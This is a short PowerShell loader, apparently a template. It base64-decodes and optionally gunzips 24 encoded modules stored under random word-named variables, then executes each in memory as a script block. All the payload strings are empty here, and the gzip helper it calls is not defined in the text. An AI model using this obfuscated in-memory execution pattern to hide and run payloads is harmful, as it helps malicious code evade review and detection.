#Requires -Version 2

$Deregulate = ""
$Semaphores = ""
$Restocking = ""
$Selflessly = ""
$Regulation = ""
$Homemakers = ""
$Maternally = ""
$Dejectedly = ""
$Credential = ""
$Obtainable = ""
$Mahoganies = ""
$Trimesters = ""
$Sandinista = ""
$Moonlights = ""
$Outriggers = ""
$Headwaters = ""
$Witchcraft = ""
$Sojourning = ""
$Listlessly = ""
$Scrunching = ""
$Procrustes = ""
$Preterites = ""
$Insulators = ""
$Compuserve = ""

$Modules = @($Deregulate,$Semaphores,$Restocking,$Selflessly,$Regulation,$Homemakers,$Maternally,$Dejectedly,$Credential,$Obtainable,$Mahoganies,$Trimesters,$Sandinista,$Moonlights,$Outriggers,$Headwaters,$Witchcraft,$Sojourning,$Listlessly,$Scrunching,$Procrustes,$Preterites,$Insulators,$Compuserve)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
}
